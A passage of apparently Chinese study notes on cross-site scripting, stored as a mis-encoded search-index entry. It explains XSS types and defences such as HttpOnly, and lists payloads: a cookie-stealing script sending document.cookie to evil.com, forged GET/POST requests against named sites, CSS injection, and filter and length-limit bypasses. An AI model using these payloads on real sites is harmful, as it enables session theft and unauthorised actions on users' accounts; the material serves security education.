‡è¯†ã€‚\n"},{"id":341,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/1.%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8/2.%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBxss/","title":"2.è·¨ç«™è„šæœ¬æ”»å‡» Xss","section":"1.å®¢æˆ·ç«¯å®‰å…¨","content":"è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ #   OWASP TOP 10 å¨èƒæ›¾å¤šæ¬¡æŠŠ XSS åˆ—åœ¨æ¦œé¦–ã€‚\n XSS ç®€ä»‹ #  è·¨ç«™è„šæœ¬æ”»å‡»ï¼š\n Cross Site Script (XSS)ã€‚é€šå¸¸æŒ‡é»‘å®¢é€šè¿‡ HTML æ³¨å…¥çš„æ–¹å¼ç¯¡æ”¹äº†ç½‘é¡µã€æ’å…¥äº†æ¶æ„çš„è„šæœ¬ï¼Œä»è€Œåœ¨ç”¨æˆ·æµè§ˆç½‘é¡µæ—¶ï¼Œæ§åˆ¶ç”¨æˆ·æµè§ˆå™¨çš„ä¸€ç§æ”»å‡»ã€‚  XSS æ ¹æ®æ•ˆæœä¸åŒå¯ä»¥åˆ†ä¸ºå¦‚ä¸‹å‡ ç±»ï¼š\n åå°„å‹ XSSï¼Œæˆ–ç§° â€œéæŒä¹…å‹ XSSâ€ï¼ˆNon-persistent XSSï¼‰ã€‚åªæ˜¯ç®€å•åœ°æŠŠç”¨æˆ·çš„è¾“å…¥ â€œåå°„â€ ç»™æµè§ˆå™¨ã€‚ å­˜å‚¨å‹ XSSï¼Œæˆ–ç§° â€œæŒä¹…å‹ XSSâ€ï¼ˆPersistent XSSï¼‰ã€‚ä¼šæŠŠç”¨æˆ·è¾“å…¥çš„æ•°æ® â€œå­˜å‚¨â€ åœ¨æœåŠ¡ç«¯ï¼Œè¿™ç§ XSS å…·æœ‰å¾ˆå¼ºçš„ç¨³å®šæ€§ã€‚ DOM Based XSSã€‚è¿™ç§ XSS ä»æ•ˆæœä¸Šæ¥çœ‹ä¹Ÿå±äºåå°„å‹ XSSã€‚ä¸åè€…çš„åŒºåˆ«æ˜¯é€šè¿‡æ›´æ”¹ DOM æ ‘çš„æ–¹å¼è€Œéæ‰§è¡Œ JavaScript ä»£ç çš„æ–¹å¼è¿›è¡Œæ”»å‡»ã€‚  XSS Payload #  çªƒå– Cookie #  æœ€å¸¸è§çš„ XSS Payload å°±æ˜¯è¯»å–æµè§ˆå™¨çš„ cookie å¯¹è±¡ï¼š\nvar img = document.createElement(\u0026#34;img\u0026#34;); img.src = \u0026#34;http://www.evil.com/log?\u0026#34;+escape(document.cookie) document.body.appendChild(img) è¿™æ®µä»£ç ä¼šåœ¨é¡µé¢ä¸­æ’å…¥ä¸€å¼ çœ‹ä¸è§çš„å›¾ç‰‡ï¼ŒåŒæ—¶æŠŠ document.cookie å¯¹è±¡ä½œä¸ºå‚æ•°å‘é€åˆ°è¿œç¨‹çš„æœåŠ¡å™¨ã€‚äº‹å®ä¸Šï¼Œ/log è·¯å¾„ä¸ä¸€å®šè¦å­˜åœ¨ï¼Œå› ä¸ºè¿™ä¸ªè¯·æ±‚ä¼šåœ¨è¿œç¨‹æœåŠ¡å™¨çš„ WEB æ—¥å¿—ä¸­ç•™ä¸‹è®°å½•ã€‚è¿™æ ·å°±åšå®Œäº†ä¸€ä¸ªæœ€ç®€å•çš„çªƒå– cookie çš„ XSS payloadã€‚\nCookie çš„ HttpOnly æ ‡è¯†å¯ä»¥é˜²æ­¢ \u0026ldquo;Cookie åŠ«æŒ\u0026rdquo;ï¼Œæœ‰çš„ç½‘ç«™åˆ™ä¼šæŠŠ Cookie ä¸å®¢æˆ·ç«¯çš„ IP ç»‘å®šã€‚\næ„é€  GET è¯·æ±‚ #  æ¯”å¦‚æœç‹ä¸Šæœ‰ä¸€ç¯‡æ–‡ç« ï¼Œå®ƒåˆ é™¤æ–‡ç« çš„é“¾æ¥æ˜¯è¿™æ ·çš„ï¼š\nhttp://blog.sohu.com/message/entry.do?m=delete\u0026amp;id=1000 å¯¹äºæ”»å‡»è€…æ¥è¯´ï¼Œåˆ™åªéœ€è¦æ„é€ å¤æ•çš„ä¸€ä¸ª payload å°±å¯ä»¥å‘èµ·ä¸€ä¸ªåˆ é™¤æ–‡ç« çš„ GET è¯·æ±‚ï¼š\nvar img = document.createElement(\u0026#34;img\u0026#34;); img.src = \u0026#34;http://blog.sohu.com/message/entry.do?m=delete\u0026amp;id=1000\u0026#34; document.body.appendChild(img) æ„é€  POST è¯·æ±‚ #  æ¯”å¦‚è±†ç“£ä¸Šæœ‰ä¸€å¤„çš„è¡¨å•æäº¤æ˜¯è¿™æ ·ä¸¤ä¸ªå­—æ®µ ck ä¸ mb_textï¼Œæˆ‘ä»¬å°è¯•æ¨¡æ‹Ÿè¿™ä¸ªè¿‡ç¨‹ã€‚è¦æ¨¡æ‹Ÿ POST è¯·æ±‚çš„è¿‡ç¨‹æœ‰ä¸¤ç§æ–¹å¼ã€‚\nç¬¬ä¸€ç§æ–¹å¼æ˜¯æ„é€ ä¸€ä¸ª form è¡¨å•ï¼Œç„¶åè‡ªåŠ¨æäº¤è¿™ä¸ªè¡¨å•ã€‚\nvar f = document.createElement(\u0026#34;form\u0026#34;); Object.assign(f, {\u0026#34;action\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;method\u0026#34;: \u0026#34;post\u0026#34;}); document.body.appendChild(f);  var i1 = document.createElement(\u0026#34;input\u0026#34;); Object.assign(i1, {\u0026#34;name\u0026#34;: \u0026#34;ck\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;JiUY\u0026#34;}); f.appendChild(i1);  var i2 = document.createElement(\u0026#34;input\u0026#34;); Object.assign(i2, {\u0026#34;name\u0026#34;: \u0026#34;mb_text\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;testtesttest\u0026#34;}); f.appendChild(i2);  f.submit(); // å¦‚æœè¡¨å•çš„å‚æ•°å¾ˆå¤šçš„è¯å¯ä»¥é€šè¿‡ç›´æ¥æ„é€  DOM èŠ‚ç‚¹çš„æ–¹å¼ ç¬¬äºŒç§æ–¹æ³•æ˜¯ï¼Œé€šè¿‡ XMLHttpRequest å‘é€ä¸€ä¸ª POST è¯·æ±‚ï¼š\nvar url = \u0026#34;http://www.douban.com\u0026#34;; var postStr = \u0026#34;ck=JiUY\u0026amp;mb_text=testtesttest\u0026#34;;  var ajax = null if (windows.XMLHttpRequest) {  ajax = new XMLHttpRequest(); } else if (windows.ActiveXObject) {  ajax = new ActiveXObject(\u0026#34;Microsoft.XMLHTTP\u0026#34;); } else {  console.log(\u0026#34;You broswer doesn\u0026#39;t support XMLHttpRequest.\u0026#34;);  return; }  ajax.open(\u0026#34;POST\u0026#34;, url, true); ajax.setRequestHeader(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/x-www-form-urlencoded\u0026#34;); ajax.send(postStr);  ajax.onreadystatechange = function(){  if(ajax.readyState == 4 \u0026amp;\u0026amp; ajax.status == 200) alert(\u0026#34;Done!\u0026#34;); } è¯†åˆ«ç”¨æˆ·æµè§ˆå™¨ #  æœ€ç›´æ¥çš„æ–¹å¼æ˜¯é€šè¿‡ XSS è¯»å–æµè§ˆå™¨çš„ UserAgent å¯¹è±¡ï¼š\nalert(natigator.userAgent); ä½†æ˜¯æµè§ˆå™¨æœ‰è®¸å¤šæ‰©å±•å¯ä»¥æ›´æ”¹è¿™ä¸ªå€¼ï¼Œæˆ–è€…å¯ä»¥è‡ªå®šä¹‰æµè§ˆå™¨å‘é€çš„ UserAgentï¼Œæ‰€ä»¥é€šè¿‡ JavaScript å–å‡ºæ¥çš„è¿™ä¸ªæµè§ˆå™¨å¯¹è±¡ï¼Œä¿¡æ¯ä¸ä¸€å®šå‡†ç¡®ã€‚\nä½†å¯¹äºæ”»å‡»è€…æ¥è¯´ï¼Œè¿˜æœ‰å¦ä¸€ç§æŠ€å·§ï¼Œå¯ä»¥å‡†ç¡®åœ°è¯†åˆ«ç”¨æˆ·çš„æµè§ˆå™¨ç‰ˆæœ¬ã€‚ç”±äºæµè§ˆå™¨ç½®é”®çš„å®ç°å­˜åœ¨å·®å¼‚ï¼Œä¸åŒçš„æµè§ˆå™¨ä¼šå„è‡ªå®ç°ä¸€äº›ç‹¬ç‰¹çš„åŠŸèƒ½ï¼Œæ‰€ä»¥é€šè¿‡åˆ†è¾¨å†™è¿™äº›æµè§ˆå™¨ä¹‹é—´çš„å·®å¼‚ï¼Œå°±èƒ½å‡†ç¡®åœ°åˆ¤æ–­å‡ºæµè§ˆå™¨ç‰ˆæœ¬ï¼Œè€Œå‡ ä¹ä¸ä¼šè¯¯æŠ¥ã€‚\nè¯†åˆ«ç”¨æˆ·å®‰è£…çš„è½¯ä»¶ #  åœ¨ IE æµè§ˆå™¨ä¸­ï¼Œå¯ä»¥é€šè¿‡åˆ¤æ–­ ActiveX æ§ä»¶çš„ classid æ˜¯å¦å­˜åœ¨ï¼Œæ¥æ¨æµ‹ç”¨æˆ·æ˜¯å¦å®‰è£…äº†è½¯ä»¶ï¼š\ntry {  var Obj = new ActivetXObject(\u0026#34;XunLeiBHO.ThunderIDHelper\u0026#34;); } catch (e) {  alert(\u0026#34;ç”¨æˆ·æœªå®‰è£…è¿…é›·\u0026#34;); } æµè§ˆå™¨çš„æ‰©å±•å’Œæ’ä»¶ä¹Ÿèƒ½è¢«æ‰«æå‡ºæ¥ã€‚æ¯”å¦‚ FireFox çš„æ’ä»¶åˆ—è¡¨å­˜æ”¾åœ¨ä¸€ä¸ª DOM å¯¹è±¡ä¸­ï¼Œé€šè¿‡æŸ¥è¯¢ DOM å¯ä»¥éå†å‡ºæ‰€æœ‰çš„æ’ä»¶ã€‚è¿™ä¸ª DOM å¯¹è±¡å¯ä»¥é€šè¿‡ navigator.plugins è®¿é—®ï¼Œå› æ­¤é€šè¿‡è¿™ä¸ªæ–¹å¼å°±å¯ä»¥æ‰¾åˆ°æ‰€æœ‰çš„æ’ä»¶ã€‚\nåœ¨ FireFox ä¸­æœ‰ä¸€ä¸ªç‰¹æ®Šçš„åè®® chrome://ï¼ŒFireFox çš„æ‰©å±•å›¾æ ‡å¯ä»¥é€šè¿‡è¿™ä¸ªåè®®è¢«è®¿é—®åˆ°ã€‚æ¯”å¦‚ Flash Got æ‰©å±•çš„å›¾æ ‡å¯ä»¥è¿™æ ·è®¿é—®ï¼šchrome://flashgot/skin/icon32.pngã€‚å› æ­¤æ‰«æ FireFox æ‰©å±•æ—¶ï¼Œåªéœ€è¦åœ¨ JavaScript ä¸­åŠ è½½è¿™å¼ å›¾ç‰‡æ£€æµ‹æ‰©å±•ï¼š\nvar m = new Image(); m.onload = function(){ alert(\u0026#34;Image Exists.\u0026#34;); }; m.onerror = function(){ alert(\u0026#34;Image not Exists.\u0026#34;); };  m.src = \u0026#34;chrome://flashgot/skin/icon32.png\u0026#34;; CSS History Hack #  è¿™ä¸ª XSS Payload å¯ä»¥é€šè¿‡ CSSï¼Œæ¥å‘ç°ä¸€ä¸ªç”¨æˆ·æ›¾ç»è®¿é—®è¿‡çš„ç½‘ç«™ã€‚\nè¿™ä¸ªæŠ€å·§æœ€æ—©è¢« Jeremiah Grossman å‘ç°ï¼Œå…¶åŸç†æ˜¯åˆ©ç”¨ style çš„ visited å±æ€§ï¼ˆå¦‚æœç”¨æˆ·è®¿é—®è¿‡æŸä¸ªé“¾æ¥ï¼Œåˆ™è¿™ä¸ªé“¾æ¥é¢œè‰²ä¼šä¸åŒï¼‰ã€‚\nä½†æ˜¯è¿™ä¸ªæ¼æ´åœ¨ 2010 å¹´å·²ç»è¢« Mozilla æµè§ˆå™¨ä¿®å¤ã€‚\nè·å–ç”¨æˆ·çš„çœŸå® IP #  JavaScript æœ¬èº«å¹¶æ²¡æœ‰æä¾›è·å–æœ¬åœ° IP åœ°å€çš„èƒ½åŠ›ã€‚ä¸€èˆ¬æ¥è¯´ï¼ŒXSS æ”»å‡»éœ€è¦å€ŸåŠ©ç¬¬ä¸‰æ–¹è½¯ä»¶æ¥å®Œæˆã€‚æ¯”å¦‚å¦‚æœå®¢æˆ·ç«¯å®‰è£…äº† Java ç¯å¢ƒï¼ˆJREï¼‰ï¼Œé‚£ä¹ˆ XSS å°±å¯ä»¥é€šè¿‡è°ƒç”¨ Java Applet çš„æ¥å£è·å–å®¢æˆ·ç«¯çš„æœ¬åœ° IP åœ°å€ã€‚\nåˆ©ç”¨ CSS æ„é€  #  åœ¨ 2005 å¹´ï¼Œå¹´ä»… 19 éšçš„ Samy Kamkar å¯¹ MySpace.com å‘èµ·çš„ XSS æ”»å‡»ã€‚å°±åˆ©ç”¨äº†è¿™ä¸ªæ–¹æ³•è¿›è¡Œæ„é€ ã€‚\nMySpace è¿‡æ»¤äº†è®¸å¤šå±é™©çš„ HTML æ ‡ç­¾ï¼Œåªä¿ç•™äº† \u0026lt;a\u0026gt;, \u0026lt;img\u0026gt;, \u0026lt;div\u0026gt; ç­‰å®‰å…¨çš„æ ‡ç­¾ï¼Œæ‰€æœ‰çš„äº‹ä»¶æ¯”å¦‚ onclick ç­‰ä¹Ÿè¢«è¿‡æ»¤äº†ã€‚å…è®¸ç”¨æˆ·æ§åˆ¶æ ‡ç­¾çš„ style å±æ€§ï¼Œæˆ‘ä»¬é€šè¿‡ styleï¼Œè¿˜æ˜¯æœ‰åŠæ³•æ„é€ å‡º XSS çš„ã€‚æ¯”å¦‚ä»¥ä¸‹çš„è¿™äº›æ–¹å¼ï¼š\n  åˆ©ç”¨ import å½¢æˆ GET è¯·æ±‚ï¼š\n\u0026lt;style\u0026gt;@import \u0026#39;http://hackers.org/xss.css\u0026#39;;\u0026lt;/style\u0026gt;   é€šè¿‡ moz-binding åµŒå…¥ xml æ–‡ä»¶ï¼ˆè¿™ä¸€ç‰¹æ€§å·²è¢«æ ‡å‡†åˆ é™¤ï¼‰ï¼š\n\u0026lt;style\u0026gt;body{-moz-binding: url(\u0026#34;http://hackers.org/xssmoz.xml#xss\u0026#34;)}\u0026lt;/style\u0026gt;   é€šè¿‡è¯·æ±‚èƒŒæ™¯å›¾ç‰‡æˆ–ä¸€äº›èµ„æºï¼Œé€šè¿‡ä¼ªåè®®æ‰§è¡Œ javascript ä»£ç ï¼š\n\u0026lt;div style=\u0026#34;background:url{\u0026#39;javascript:alert(1)\u0026#39;}\u0026#34; /\u0026gt;   é€šè¿‡è¡¨è¾¾å¼æ„é€  XSS:\n\u0026lt;div style=\u0026#34;width: expression(alert(\u0026#39;xss\u0026#39;))\u0026#34; /\u0026gt;   é€šè¿‡ behavior å…³é”®å­—æ‰§è¡Œ javascript ä»£ç ï¼š\n\u0026lt;div style=\u0026#34;behavior: url(xss.htc)\u0026#34; /\u0026gt;   æ”»å‡»æ¡†æ¶ #  åŸä¹¦ä¸­ä»‹ç»äº† Attack APIã€BeEFã€XSS Proxy è¿™æ ·ä¸‰ä¸ªæ”»å‡»å¹³å°ã€‚\nXSS Worm #  è •è™«ï¼š\n ä»¥å¾€çš„è •è™«æ˜¯åˆ©ç”¨æœåŠ¡ç«¯è½¯ä»¶æ¼æ´è¿›è¡Œä¼ æ’­çš„ã€‚æ¯”å¦‚ 2003 å¹´çš„å†²å‡»æ³¢è •è™«ï¼Œåˆ©ç”¨çš„æ˜¯ Windows çš„RPC è¿œç¨‹æº¢å‡ºæ¼æ´ã€‚  XSS Worm æ˜¯ XSS çš„ä¸€ç§ç»ˆæåˆ©ç”¨æ–¹å¼ï¼Œå®ƒçš„ç ´ååŠ›ä¸å½±å“åŠ›æ˜¯å·¨å¤§çš„ã€‚ä½†æ˜¯å‘èµ· XSS Worm æ”»å‡»ä¹Ÿæœ‰ä¸€å®šçš„æ¡ä»¶ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œç”¨æˆ·ä¹‹é—´å‘ç”Ÿäº¤äº’è¡Œä¸ºçš„é¡µé¢ï¼Œå¦‚æœå­˜åœ¨å­˜å‚¨å‹ XSSï¼Œåˆ™æ¯”è¾ƒå®¹æ˜“å‘èµ· XSS Worm æ”»å‡»ã€‚\nåŸä¹¦ä¸­ä»‹ç»äº† Samy Worm ä¸ç™¾åº¦ç©ºé—´è •è™«ä¸¤ä¸ªè •è™«ã€‚å› ä¸ºå¹´ä»£ä¹…è¿œï¼Œå‚è€ƒä»·å€¼ä¸å¤§ã€‚\nXSS çš„ç»•è¿‡ #  åˆ©ç”¨å­—ç¬¦ç¼–ç  #  å°±æ˜¯ GBK/GBK2312 å®½å­—ç¬¦é›†æ¼æ´ã€‚åœ¨è¿™ä¸ªå­—ç¬¦é›†ä¸­ %c1 è¿™ä¸ªå­—ç¬¦ä¸ \\ åæ–œæ æ„æˆä¸€ä¸ªå®Œæ•´çš„ Unicode å­—ç¬¦ã€‚æ¯”å¦‚ä½¿ç”¨ä»¥ä¸‹çš„ payloadï¼š\n%c1\u0026#34;;alert(XSS);// å…¶ä¸­ \u0026quot; ä¼šè¢«é€ƒé€¸ï¼ˆå³åœ¨ç¬¦å·å‰é¢æ’å…¥ \\ è¿™ä¸ªå­—ç¬¦ï¼‰ï¼Œä½†æ˜¯å› ä¸ºå‰é¢çš„ä»‹ç»ï¼Œåœ¨å®½å­—ç¬¦é›†ä¸­ï¼Œè¿™ä¸ªåæ–œæ ä¼šè¢«æˆ‘ä»¬çš„ %c1 åƒæ‰å½¢æˆä¸€ä¸ª Unicode å­—ç¬¦ï¼Œä»è€Œä½¿ ; é€ƒé€¸å‡ºæ¥ã€‚\nç»•è¿‡é•¿åº¦é™åˆ¶ #  æ¯”å¦‚ url ä¸º http://www.a.com/index.html ä¸­çš„ html å­˜åœ¨é€šè¿‡ä¸‹é¢çš„æ–¹å¼æ¸²æŸ“ï¼š\n\u0026lt;input type=text value=\u0026#34;$var\u0026#34; /\u0026gt; å¦‚æœæœåŠ¡ç«¯å¯¹å­—ç¬¦ä¸²çš„é•¿åº¦åšäº†é™åˆ¶ï¼Œé‚£ä¹ˆæ”»å‡»è€…ç›´æ¥æ„é€  \u0026lt;script\u0026gt; æ ‡ç­¾åˆ™å¯èƒ½ä¼šå¯¼è‡´è¿‡é•¿ï¼š\n  ç¬¬ä¸€ç§åŠæ³•æ˜¯å°† JavaScript ä»£ç ç»‘å®šåˆ°ä¸€ä¸ªäº‹ä»¶ä¸­å»ï¼Œæ¯”å¦‚ï¼š\n$var èµ‹å€¼ä¸º \u0026#34;onclick=alert(1)//   ä½†æ˜¯åˆ©ç”¨ äº‹ä»¶ èƒ½å¤Ÿç¼©çŸ­çš„å­—èŠ‚æ•°æ˜¯æœ‰é™çš„ã€‚æœ€å¥½çš„åŠæ³•æ˜¯å°† XSS Payload å†™åˆ°åˆ«å¤„ã€‚\næœ€å¸¸ç”¨çš„ä¸€ä¸ªâ€œéšè—ä»£ç â€çš„åœ°æ–¹å°±æ˜¯ location.hashã€‚è€Œä¸”æ ¹æ® HTTP åè®®ï¼Œè¿™ä¸ªå†…å®¹ä¸ä¼šå†ç½‘ç»œè¯·æ±‚ä¸­å‘é€ï¼Œæ‰€ä»¥ WEB æœåŠ¡å™¨ä¹Ÿä¸ä¼šè®°å½•æˆ‘ä»¬éšè—çš„å†…å®¹ã€‚\nå› ä¸º location.hash çš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯ #ï¼Œæ‰€ä»¥å¿…é¡»å»é™¤ç¬¬ä¸€ä¸ªå­—ç¬¦æ‰è¡Œï¼Œæ‰€ä»¥å¯ä»¥æ„é€ ï¼š\n$var èµ‹å€¼ä¸º \u0026#34;onclick=\u0026#34;eval(location.hash.substr(1)) åŒæ—¶æ„é€ ä¸€ä¸ª HTML url ä¸ºï¼š\nhttp://www.a.com/index.html#alert(1)   å†æŸäº›ç¯å¢ƒä¸‹ï¼Œå¯ä»¥åˆ©ç”¨æ³¨é‡Šç¬¦ç»•è¿‡é•¿åº¦é™åˆ¶ã€‚\næ¯”å¦‚æˆ‘ä»¬èƒ½æ§åˆ¶ä¸¤ä¸ªæ–‡æœ¬æ¡†ï¼Œç¬¬äºŒä¸ªæ–‡æœ¬æ¡†å…è®¸å†™å…¥æ›´å¤šçš„å­—èŠ‚ã€‚æ­¤æ—¶å¯ä»¥åˆ©ç”¨ HTML çš„æ³¨é‡Šç¬¦å·ï¼ŒæŠŠä¸¤ä¸ªæ–‡æœ¬æ¡†ä¹‹é—´çš„ä»£ç å…¨éƒ¨æ³¨é‡Šæ‰ï¼Œä»è€Œ â€œæ‰“é€šâ€ ä¸¤ä¸ª \u0026lt;input\u0026gt; æ ‡ç­¾ã€‚\n  \u0026lt;base\u0026gt; æ ‡ç­¾ #  è¿™ä¸ªæ ‡ç­¾çš„ä½œç”¨æ˜¯å®šä¹‰é¡µé¢ä¸Šä½¿ç”¨ â€œç›¸å¯¹è·¯å¾„â€ æ ‡ç­¾çš„ hosting åœ°å€ã€‚æ¯”å¦‚ï¼š\n\u0026lt;body\u0026gt;  \u0026lt;base href=\u0026#34;http://www.google.com/\u0026#34; /\u0026gt;  \u0026lt;img src=\u0026#34;/int1/en_ALL/images/srpr/logolw.png\u0026#34; /\u0026gt; \u0026lt;/body\u0026gt; ä¸Šé¢è¿™æ®µä»£ç å°†ä¼šä½¿å¾— \u0026lt;img\u0026gt; æ ‡ç­¾ä¸­çš„å›¾ç‰‡ä» http://www.google.com/int1/en_ALL/images/srpr/logolw.png å–å¾—ã€‚\nå¯è§ \u0026lt;base\u0026gt; æ ‡ç­¾æ˜¯ä¸ªæå…¶å±é™©çš„æ ‡ç­¾ã€‚æ‰€ä»¥åœ¨è®¾è®¡ XSS å®‰å…¨æ–¹æ¡ˆæ—¶ï¼Œä¸€å®šè¦è¿‡æ»¤æ‰è¿™ä¸ªéå¸¸å±é™©çš„æ ‡ç­¾ã€‚\nwindow.name çš„ä½¿ç”¨ #  window.name å¯¹è±¡æ˜¯ä¸€ä¸ªç¥å¥‡çš„ä¸œè¥¿ã€‚å¦‚æœå¯¹å½“å‰çª—å£çš„ window.name å¯¹è±¡èµ‹å€¼ï¼Œæ²¡æœ‰ç‰¹æ®Šå­—ç¬¦çš„é™åˆ¶ã€‚å› ä¸º window å¯¹è±¡æ˜¯æµè§ˆå™¨çš„çª—ä½“ï¼Œè€Œé document å¯¹è±¡ï¼Œå¾ˆå¤šæ—¶å€™ä¸å—åŒæºç­–ç•¥çš„é™åˆ¶ã€‚æ”»å‡»è€…åˆ©ç”¨è¿™ä¸ªå¯¹è±¡ï¼Œå¯ä»¥å®ç°è·¨é¡µé¢ä¼ é€’æ•°æ®ã€‚\næ¯”å¦‚ www.a.com/index.html çš„ä»£ç å¦‚ä¸‹ï¼š\n\u0026lt;body\u0026gt;  \u0026lt;script\u0026gt;  window.name = document.cookie;  window.location = \u0026#34;http://www.b.com/index.html\u0026#34;;  \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; è¿™æ®µä»£ç å°†æŠŠåœ¨åŸŸ www.a.com ä¸­çš„ cookie æºå¸¦åˆ° www.b.com è¿™ä¸ªåŸŸä¸­ã€‚åœ¨åè€…ä¸­å¯ä»¥è®¿é—®è¿™ä¸ªå†…å®¹ï¼š\n\u0026lt;body\u0026gt;  \u0026lt;script\u0026gt;  console.log(window.name);  \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; ä½¿ç”¨ window.name å¯ä»¥ç¼©çŸ­ XSS Payload çš„é•¿åº¦ï¼Œåœ¨ç›®æ ‡ç«™ç‚¹åªéœ€è¦æ‰§è¡Œä»¥ä¸‹ä»£ç å³å¯ï¼š\neval(name); è¿™ä¸ªåªæœ‰ 11 ä¸ªå­—ç¬¦ã€‚\nè¿™ä¸ªæŠ€å·§ä¸ºå®‰å…¨ç ”ç©¶è€… luoluo å‘ç°ï¼Œå¦å¤–å®ƒè¿˜æ•´ç†äº†è®¸å¤š XSS é•¿åº¦ç»•è¿‡æŠ€å·§ï¼ˆè§ ã€Šçªç ´ XSS å­—ç¬¦æ•°é‡é™åˆ¶æ‰§è¡Œä»»æ„ JS ä»£ç ã€‹ï¼‰ã€‚\nåˆ©ç”¨åå°„å‹ XSS #  Apache Expect Header XSS #  è¿™ä¸ªæ¼æ´æœ€æ—©å…¬å¸ƒäº 2006 å¹´ã€‚\nè¿™æ˜¯ Apache çš„æ¼æ´ï¼Œå½±å“èŒƒå›´ç›¸å½“å¹¿ã€‚ä½†æ˜¯è¿™ä¸ªåˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œéœ€è¦æäº¤è¯·æ±‚æ—¶å‘ HTTP å¤´ä¸­æ³¨å…¥æ¶æ„æ•°æ®ï¼Œæ‰èƒ½è§¦å‘è¿™ä¸ªæ¼æ´ã€‚ä½†å¯¹äº XSS æ”»å‡»æ¥è¯´ï¼ŒJavaScript æ—¶æ— æ³•æ§åˆ¶ HTTP è¯·æ±‚å¤´çš„ã€‚æ‰€ä»¥è¿™ä¸ªæ¼æ´æ›¾ç»ä¸€åº¦è¢«è®¤ä¸ºæ˜¯ â€œé¸¡è‚‹â€ æ¼æ´ã€‚\nåæ¥å®‰å…¨ç ”ç©¶è€… \u0026ldquo;Amit Klein\u0026rdquo; æå‡ºäº† â€œä½¿ç”¨ Flash æ„é€ è¯·æ±‚â€ çš„æ–¹æ³•ï¼ŒæˆåŠŸåˆ©ç”¨äº†è¿™ä¸ªæ¼æ´ã€‚\nAnehta çš„å›æ—‹é•– #  åå°„å‹ XSS ä¹Ÿæœ‰å¯èƒ½åƒå­˜å‚¨å‹ XSS ä¸€æ ·åˆ©ç”¨ï¼Œå°†è¦åˆ©ç”¨çš„åå°„å‹ XSS åµŒå…¥ä¸€ä¸ªå­˜å‚¨å‹ XSS ä¸­ã€‚è¿™ä¸ªæ”»å‡»æŠ€å·§ï¼Œæ›¾ç»åœ¨ Anehtaï¼ˆé“å“¥å†™è¿‡çš„ä¸€ä¸ªæ”»å‡»å¹³å°ï¼‰ä¸­ä½¿ç”¨è¿‡ã€‚\nå›æ—‹é•–çš„æ€è·¯æ˜¯ï¼š\n å¦‚æœåœ¨ B åŸŸä¸Šå­˜åœ¨ä¸€ä¸ªåå°„å‹çš„ \u0026ldquo;XSS_B\u0026rdquo;ï¼Œåœ¨ A åŸŸä¸Šå­˜åœ¨ä¸€ä¸ªå­˜å‚¨å‹ â€XSS_Aâ€œï¼› å½“ç”¨æˆ·è®¿é—® A åŸŸä¸Šçš„ â€XSS_Aâ€œ æ—¶ï¼ŒåŒæ—¶åµŒå…¥ B åŸŸä¸Šçš„ â€XSS_Bâ€œï¼Œåˆ™å¯ä»¥è¾¾åˆ°åœ¨ A åŸŸä¸Šçš„ XSS æ”»å‡» B åŸŸç”¨æˆ·çš„ç›®çš„ã€‚  XSS çš„é˜²å¾¡ #  æµè¡Œçš„æµè§ˆå™¨éƒ½å†…ç½®äº†ä¸€äº›å¯¹æŠ— XSS çš„æªæ–½ï¼Œæ¯”å¦‚ FireFox çš„ CSPã€Noscript æ‰©å±•ã€IE 8 å†…ç½®çš„ XSS Filter ç­‰ã€‚\nåœ¨æœ¬ç« ä¸­ï¼Œä¸»è¦æŠŠç²¾åŠ›æ”¾åœ¨å¦‚ä½•ä¸ºç½‘ç«™è®¾è®¡å®‰å…¨çš„ XSS è§£å†³æ–¹æ¡ˆä¸Šã€‚\nHttpOnly #  æœ€æ—©ç”±å¾®è½¯æå‡ºï¼Œå¹¶ä¸”åœ¨ IE 6 ä¸­å®ç°ï¼Œè‡³ä»Šå·²ç»é€æ¸æˆä¸ºä¸€ä¸ªæ ‡å‡†ã€‚æµè§ˆå™¨å°†ç¦æ­¢é¡µé¢çš„ JavaScript è®¿é—®å¸¦æœ‰ HttpOnly å±æ€§çš„ Cookieã€‚\nHttpOnly çš„å‡ºç°å¹¶éä¸ºäº†å¯¹æŠ— XSSï¼Œå®ƒè§£å†³çš„æ˜¯ XSS åçš„ Cookie åŠ«æŒæ”»å‡»ã€‚\nä¸€ä¸ª Cookie çš„ä½¿ç”¨æµç¨‹å¦‚ä¸‹ï¼š\n  æµè§ˆå™¨å‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚ï¼Œè¿™æ—¶æ²¡æœ‰ Cookieï¼›\n  æœåŠ¡å™¨è¿”å›æ—¶å‘é€ Set-Cookie å¤´ï¼Œå‘å®¢æˆ·ç«¯æµè§ˆå™¨å†™å…¥ Cookieï¼›\nSet-Cookie: \u0026lt;name\u0026gt;=\u0026lt;value\u0026gt;[; \u0026lt;Max-Age\u0026gt;=\u0026lt;age\u0026gt;][; expire=\u0026lt;date\u0026gt;][; domain=\u0026lt;domain_name\u0026gt;][; path=\u0026lt;some_path\u0026gt;][; secure][; HttpOnly]   åœ¨è¯¥ Cookie åˆ°æœŸå‰ï¼Œæµè§ˆå™¨è®¿é—®åŸŸä¸‹çš„æ‰€æœ‰é¡µé¢ï¼Œéƒ½å°†å‘é€è¯¥ Cookieï¼›\n  éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒæœåŠ¡å™¨å¯èƒ½ä¼šè®¾ç½®å¤šä¸ª Cookieï¼Œè€Œ HttpOnly å¯ä»¥æœ‰é€‰æ‹©æ€§åœ°åŠ åœ¨ä»»ä½•ä¸€ä¸ª Cookie ä¸Šã€‚\nè¾“å…¥æ£€æŸ¥ #  åœ¨ XSS 